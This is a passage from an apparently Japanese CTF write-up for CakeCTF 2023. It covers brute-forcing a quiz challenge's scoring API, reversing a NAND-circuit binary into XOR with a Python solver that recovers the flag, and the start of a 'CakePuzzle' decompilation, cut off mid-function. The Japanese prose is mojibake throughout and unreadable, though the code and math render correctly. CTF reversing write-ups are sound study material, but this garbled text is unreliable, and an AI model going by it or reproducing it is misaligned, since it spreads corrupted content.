ãã®ãŸã‚ã€<code>/api/start</code>ã‚’å©ã„ãŸæ™‚ç‚¹ã§session idã‚’ä¿å­˜ã—ã¦ãŠãã€ã“ã®sessionã‚’ç”¨ã„ã¦1å•ãšã¤<code>/api/submit</code>ã§å›ç­”ã‚’å¤‰æ›´ã—ã¦<code>/api/score</code>ã§ã‚¹ã‚³ã‚¢ç¢ºèªã€1ç‚¹ä¸ŠãŒã£ãŸã‚‰ãã®å•é¡Œã¯æ­£è§£ãªã®ã§æ¬¡ã®å•é¡Œã¨ã„ã†ã“ã¨ã‚’100å›ç¹°ã‚Šè¿”ã›ã°æœ€æ‚ª400é€šã‚Šã§flagã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ä»Šã¾ã§è€ƒãˆã¦ã„ã¾ã›ã‚“ã§ã—ãŸãŒTOEICã¯200å•å‡ºé¡Œã•ã‚Œã‚‹ãŸã‚ã€
å›ç­”ã®çµ„ã¿åˆã‚ã›ã¯$4^{200}$é€šã‚Šã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®ç·å½“ãŸã‚Šã®å€‹æ•°ã‚’çŸ¥ã£ã¦ã„ãŸã¨ã“ã‚ã§TOEICã¯å›ç­”ã®å†æå‡ºã¨è©¦é¨“ä¸­ã®ã‚¹ã‚³ã‚¢ç¢ºèªãŒã§ããªã„ãŸã‚ã€çµå±€è©¦é¨“ã¯ä¸€ç™ºå‹è² ã§ã™ã€‚ï¼ˆãã‚‚ãã‚‚TOEICã®ã‚¹ã‚³ã‚¢ã¯å—é¨“è€…å…¨å“¡ã®ã‚¹ã‚³ã‚¢ãŒåˆ†ã‹ã£ã¦ã„ãªã„ã¨è¨ˆç®—ã§ããªã„ï¼‰</p>
<h2 id=rev>rev</h2>
<h3 id=nande-warmup-rev>nande [warmup, rev]</h3>
<p>æ¸¡ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€<code>nand.exe</code>ã¨<code>nand.pdb</code>ã§ã™ã€‚<code>.pdb</code>ã¯ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ãƒ•ã‚¡ã‚¤ãƒ«åã€ã‚·ãƒ³ãƒœãƒ«ãªã©ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ‡ãƒãƒƒã‚°æ™‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚<code>nand.exe</code>ã¯æ¬¡ã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«å½¢å¼ã§ã—ãŸã€‚æ‹¡å¼µå­ã®é€šã‚ŠPEãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>nand.exe: PE32+ executable (console) x86-64, for MS Windows
</code></pre></td></tr></table>
</div>
</div><p>Ghidraã§é™çš„è§£æã—ã¾ã™ã€‚ã¾ãšã€<code>main</code>é–¢æ•°ã§ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>_Argc</span><span class=p>,</span><span class=kt>char</span> <span class=o>**</span><span class=n>_Argv</span><span class=p>,</span><span class=kt>char</span> <span class=o>**</span><span class=n>_Env</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>char</span> <span class=o>*</span><span class=n>_Str</span><span class=p>;</span>
  <span class=kt>bool</span> <span class=n>bVar1</span><span class=p>;</span>
  <span class=n>size_t</span> <span class=n>sVar2</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>local_30</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>local_28</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>local_20</span><span class=p>;</span>
  
  <span class=k>if</span> <span class=p>(</span><span class=n>_Argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
    <span class=n>printf</span><span class=p>(</span><span class=nl>s_Usage</span><span class=p>:</span><span class=n>_</span><span class=o>%</span><span class=n>s_</span><span class=o>&lt;</span><span class=n>flag</span><span class=o>&gt;</span><span class=n>_14001e100</span><span class=p>,</span><span class=o>*</span><span class=n>_Argv</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>else</span> <span class=p>{</span>
    <span class=n>_Str</span> <span class=o>=</span> <span class=n>_Argv</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
    <span class=n>sVar2</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>_Str</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>sVar2</span> <span class=o>==</span> <span class=mh>0x20</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>for</span> <span class=p>(</span><span class=n>local_28</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>&lt;</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>=</span> <span class=n>local_28</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>for</span> <span class=p>(</span><span class=n>local_30</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_30</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=n>local_30</span> <span class=o>=</span> <span class=n>local_30</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
          <span class=n>InputSequence</span><span class=p>[</span><span class=n>local_30</span> <span class=o>+</span> <span class=n>local_28</span> <span class=o>*</span> <span class=mi>8</span><span class=p>]</span> <span class=o>=</span>
               <span class=p>(</span><span class=n>byte</span><span class=p>)((</span><span class=kt>int</span><span class=p>)</span><span class=n>_Str</span><span class=p>[</span><span class=n>local_28</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=p>((</span><span class=n>byte</span><span class=p>)</span><span class=n>local_30</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>;</span>
        <span class=p>}</span>
      <span class=p>}</span>
      <span class=n>CIRCUIT</span><span class=p>(</span><span class=n>InputSequence</span><span class=p>,</span><span class=n>OutputSequence</span><span class=p>);</span>
      <span class=n>bVar1</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
      <span class=k>for</span> <span class=p>(</span><span class=n>local_20</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_20</span> <span class=o>&lt;</span> <span class=mh>0x100</span><span class=p>;</span> <span class=n>local_20</span> <span class=o>=</span> <span class=n>local_20</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>bVar1</span> <span class=o>=</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)(</span><span class=n>bVar1</span> <span class=o>&amp;</span> <span class=n>OutputSequence</span><span class=p>[</span><span class=n>local_20</span><span class=p>]</span> <span class=o>==</span> <span class=n>AnswerSequence</span><span class=p>[</span><span class=n>local_20</span><span class=p>]);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=n>bVar1</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>puts</span><span class=p>(</span><span class=n>s_Correct</span><span class=o>!</span><span class=n>_14001e118</span><span class=p>);</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=n>puts</span><span class=p>(</span><span class=n>s_Wrong</span><span class=p>...</span><span class=n>_14001e128</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>ã“ã“ã‹ã‚‰æ¬¡ã®ã‚ˆã†ãªã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚</p>
<ul>
<li>ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³å¼•æ•°ã«å…¥åŠ›ã—ãŸæ–‡å­—åˆ—(<code>_Argv[1]</code>)ã®é•·ã•ãŒ0x20=32</li>
<li>å…¥åŠ›ã—ãŸæ–‡å­—åˆ—ã‚’ãƒªãƒˆãƒ«ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã§ãƒã‚¤ãƒŠãƒªã«å±•é–‹ã—ã¦<code>InputSequence</code>ã«æ ¼ç´</li>
<li><code>CIRCUIT</code>é–¢æ•°ã«<code>InputSequence</code>ã‚’å…¥åŠ›ã—ã¦ã€<code>OutputSequence</code>ã«å‡ºåŠ›ã—ã¦ã„ã‚‹</li>
<li><code>OutputSequence</code>ã¨<code>AnswerSequence</code>ã‚’æ¯”è¼ƒã—ã¦å…¨éƒ¨ä¸€è‡´ã—ã¦ã„ãŸã‚‰ã€å…¥åŠ›ã—ãŸæ–‡å­—åˆ—ãŒflag</li>
</ul>
<p>ã•ã¦ã€ã“ã“ã§å®Ÿéš›ã«é‡è¦ãªå‡¦ç†ã‚’è¡Œã£ã¦ã„ã‚‹ç®‡æ‰€ã¯<code>CIRCUIT</code>é–¢æ•°ã§ã‚ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã®ã§ã€<code>CICRUIT</code>é–¢æ•°ã‚’è¦‹ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=nf>CIRCUIT</span><span class=p>(</span><span class=n>uchar</span> <span class=o>*</span><span class=n>param_1</span><span class=p>,</span><span class=n>uchar</span> <span class=o>*</span><span class=n>param_2</span><span class=p>)</span>

<span class=p>{</span>
  <span class=n>ulonglong</span> <span class=n>local_28</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>i</span><span class=p>;</span>
  
  <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x1234</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>for</span> <span class=p>(</span><span class=n>local_28</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>&lt;</span> <span class=mh>0xff</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>=</span> <span class=n>local_28</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>MODULE</span><span class=p>(</span><span class=n>param_1</span><span class=p>[</span><span class=n>local_28</span><span class=p>],</span><span class=n>param_1</span><span class=p>[</span><span class=n>local_28</span> <span class=o>+</span> <span class=mi>1</span><span class=p>],</span><span class=n>param_2</span> <span class=o>+</span> <span class=n>local_28</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=n>MODULE</span><span class=p>(</span><span class=n>param_1</span><span class=p>[</span><span class=n>local_28</span><span class=p>],</span><span class=sc>&#39;\x01&#39;</span><span class=p>,</span><span class=n>param_2</span> <span class=o>+</span> <span class=n>local_28</span><span class=p>);</span>
    <span class=n>memcpy</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>param_2</span><span class=p>,</span><span class=mh>0x100</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>MODULE</code>é–¢æ•°ã‚’0x1234å›ã ã‘ç¹°ã‚Šè¿”ã—å‘¼ã³å‡ºã—ã¦ã„ã¾ã™ã€‚<code>MODULE</code>é–¢æ•°ã‚‚è¦‹ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=nf>MODULE</span><span class=p>(</span><span class=n>uchar</span> <span class=n>param_1</span><span class=p>,</span><span class=n>uchar</span> <span class=n>param_2</span><span class=p>,</span><span class=n>uchar</span> <span class=o>*</span><span class=n>param_3</span><span class=p>)</span>

<span class=p>{</span>
  <span class=n>undefined</span> <span class=n>auStack_38</span> <span class=p>[</span><span class=mi>32</span><span class=p>];</span>
  <span class=n>uchar</span> <span class=n>local_18</span><span class=p>;</span>
  <span class=n>uchar</span> <span class=n>local_17</span><span class=p>;</span>
  <span class=n>uchar</span> <span class=n>local_16</span> <span class=p>[</span><span class=mi>6</span><span class=p>];</span>
  <span class=n>ulonglong</span> <span class=n>local_10</span><span class=p>;</span>
  
  <span class=n>local_10</span> <span class=o>=</span> <span class=n>__security_cookie</span> <span class=o>^</span> <span class=p>(</span><span class=n>ulonglong</span><span class=p>)</span><span class=n>auStack_38</span><span class=p>;</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>param_2</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_18</span><span class=p>);</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>local_18</span><span class=p>,</span><span class=n>local_16</span><span class=p>);</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>param_2</span><span class=p>,</span><span class=n>local_18</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_17</span><span class=p>);</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>local_16</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>local_17</span><span class=p>,</span><span class=n>param_3</span><span class=p>);</span>
  <span class=n>__security_check_cookie</span><span class=p>(</span><span class=n>local_10</span> <span class=o>^</span> <span class=p>(</span><span class=n>ulonglong</span><span class=p>)</span><span class=n>auStack_38</span><span class=p>);</span>
  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>NANDã‚’4å›ã ã‘å‘¼ã³å‡ºã—ã¦ã¾ã™ã€‚ã“ã‚Œã‚’æ•°å¼ã¨å›è·¯å›³ã«è½ã¨ã—è¾¼ã‚“ã§ã¿ã¾ã™ã€‚
<img src=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit.png width=672 height=221 srcset="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit_hu2d39ee020d3ce23cf486f494d30c6a22_26649_480x0_resize_box_3.png 480w, https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit_hu2d39ee020d3ce23cf486f494d30c6a22_26649_1024x0_resize_box_3.png 1024w" loading=lazy alt="MODULEå†…éƒ¨ å›è·¯å›³" class=gallery-image data-flex-grow=304 data-flex-basis=729px>
æ•°å¼ã¯æ¬¡ã®é€šã‚Šã§ã™ã€‚ï¼ˆè¨˜å·ã¯ä¸Šè¨˜ã®å›³ã«åˆã‚ã›ã¦ã„ã¾ã™ï¼‰
$$
\begin{align}
c &= \overline{\{\overline{(\overline{a\cdot b}) \cdot a}\}\cdot \{\overline{(\overline{a\cdot b}) \cdot b}\}} \nonumber \\
&= \{(\overline{a\cdot b})\cdot a\} + \{(\overline{a\cdot b})\cdot b\} \nonumber \\
&= \{(\overline{a} + \overline{b}) \cdot a\} + \{(\overline{a} + \overline{b}) \cdot b\} \nonumber \\
&= \overline{a}\cdot a + a\cdot \overline{b} + \overline{a}\cdot b + \overline{b}\cdot b \nonumber \\
&= a\cdot \overline{b} + \overline{a}\cdot b \nonumber \\
&= a \oplus b
\end{align}
$$
å¼(1)ã‚ˆã‚Š<code>MODULE</code>é–¢æ•°ã®æ•°å¼ã‚’å±•é–‹ã—ã¦ã„ãã¨ã€xoræ¼”ç®—ã‚’ã—ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚
ã“ã‚Œã‚‰ã®ã“ã¨ã‹ã‚‰ã€<code>CIRCUIT</code>é–¢æ•°ã¯æ¬¡ã®ã‚ˆã†ãªæ“ä½œã‚’0x1234å›ç¹°ã‚Šæ›¿ãˆã—è¡Œã£ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚
$$
\begin{align}
\mathrm{param2[local28]} &\leftarrow \mathrm{param1[local28]} \oplus \mathrm{param1[local28 + 1]} \ (\mathrm{local28} = 0 \cdots \mathrm{0xfe}) \nonumber \\
\mathrm{param2[0xff]} &\leftarrow \mathrm{0xff} \oplus 1 \nonumber \\
\mathrm{param1} &\leftarrow \mathrm{param2} \nonumber
\end{align}
$$
xorã®æ€§è³ªã®ä¸€ã¤ã§ã‚ã‚‹$a\oplus b \oplus b = a$ã‚’ç”¨ã„ã‚‹ã“ã¨ã§ä»¥ä¸Šã®æ¼”ç®—ã®é€†æ¼”ç®—ã‚’è¡Œã†ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã‚½ãƒ«ãƒãƒ¼ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>answer_sequence</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01\x01\x01\x01\x01\x00\x00\x01\x01\x00\x00\x01\x00\x00\x01\x00\x00\x01\x01\x00\x00\x00\x00\x01\x01\x01\x01\x01\x00\x00\x01\x01\x01\x01\x00\x01\x00\x01\x01\x01\x00\x00\x00\x01\x01\x00\x01\x01\x01\x01\x00\x01\x00\x01\x00\x00\x01\x00\x01\x00\x01\x01\x00\x01\x00\x00\x01\x01\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x01\x00\x01\x01\x01\x00\x00\x01\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x01\x01\x01\x01\x00\x01\x01\x00\x00\x00\x01\x01\x00\x00\x01\x01\x00\x01\x01\x00\x00\x00\x01\x00\x01\x01\x01\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x01\x01\x00\x01\x00\x00\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01\x00\x01\x00\x00\x01\x01\x00\x01\x01\x01\x00\x01\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x01\x01\x00\x01\x01\x00\x01\x01\x00\x01\x00\x01\x00\x01\x00\x00\x01\x01\x01\x01\x01\x00\x01\x01\x00\x01\x01\x01\x00\x00\x01\x00\x01\x01\x00\x01\x01\x00\x00\x01\x00\x00\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x01\x00\x01\x01\x00</span><span class=s1>&#39;</span>

<span class=n>index_list</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>

<span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1234</span><span class=p>):</span>
    <span class=n>tmp_answer_sequence</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)]</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>index_list</span><span class=p>:</span>
        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mh>0xff</span><span class=p>:</span>
            <span class=n>tmp_answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=mi>1</span>
        <span class=k>else</span><span class=p>:</span>
            <span class=n>tmp_answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>tmp_answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span>
    <span class=n>answer_sequence</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>tmp_answer_sequence</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>get_flag_str</span><span class=p>(</span><span class=n>flag_sequence</span><span class=p>):</span>
    <span class=n>flag</span> <span class=o>=</span> <span class=p>[]</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>):</span>
        <span class=n>a</span> <span class=o>=</span> <span class=n>flag_sequence</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=p>:(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>]</span>
        <span class=n>flag_char</span> <span class=o>=</span> <span class=mi>0</span>
        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
            <span class=n>flag_char</span> <span class=o>+=</span> <span class=n>a</span><span class=p>[</span><span class=n>j</span><span class=p>]</span><span class=o>*</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>j</span><span class=p>)</span>
        <span class=n>flag</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>flag_char</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>chr</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>flag</span><span class=p>]))</span>

<span class=n>get_flag_str</span><span class=p>(</span><span class=n>answer_sequence</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><p>ã“ã‚Œã‚’å®Ÿè¡Œã—ã¦flagãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚
ã‚ˆã£ã¦flagã¯<code>CakeCTF{h2fsCHAo3xOsBZefcWudTa4}</code>ã§ã™ã€‚</p>
<h3 id=cakepuzzle-rev>CakePuzzle [rev]</h3>
<p>å•é¡Œæ–‡ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€ncã§ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‚¿ã‚¤ãƒ—ã®å•é¡Œã®ã‚ˆã†ã§ã™ã€‚
ncã§ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¾ã™ã€‚<code>></code>ã ã‘å‡ºã¦ãã¦æ–‡å­—ã®å…¥åŠ›ãŒå¯èƒ½ã§ã—ãŸã€‚
ã—ã‹ã—ã€ã©ã‚“ãªæ–‡å­—ã‚’æ‰“ã£ã¦ã‚‚<code>></code>ã—ã‹å‡ºã¦ãã¾ã›ã‚“ã€‚</p>
<p>æ¸¡ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯<code>chal</code>ã®ã¿ã§ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«å½¢å¼ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã—ãŸã€‚ELFã§ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4c2b97895e9493536557f72e973e5ed194a49854, for GNU/Linux 3.2.0, not stripped
</code></pre></td></tr></table>
</div>
</div><p>Ghidaraã§é™çš„è§£æã—ã¾ã™ã€‚mainé–¢æ•°ã‚’è¦‹ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>int</span> <span class=n>iVar1</span><span class=p>;</span>
  <span class=n>undefined8</span> <span class=n>uVar2</span><span class=p>;</span>
  <span class=kt>char</span> <span class=n>local_78</span> <span class=p>[</span><span class=mi>112</span><span class=p>];</span>
  
  <span class=n>alarm</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
  <span class=k>while</span><span class=p>(</span> <span class=nb>true</span> <span class=p>)</span> <span class=p>{</span>
    <span class=n>uVar2</span> <span class=o>=</span> <span class=n>q</span><span class=p>();</span>
    <span class=k>if</span> <span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>uVar2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>win</span><span class=p>();</span>
    <span class=p>}</span>
    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
    <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
    <span class=n>iVar1</span> <span class=o>=</span> <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>DAT_00102019</span><span class=p>,</span><span class=n>local_78</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
    <span class=n>e</span><span class=p>(</span><span class=n>local_78</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
  <span class=p>}</span>
                    <span class=cm>/* WARNING: Subroutine does not return */</span>
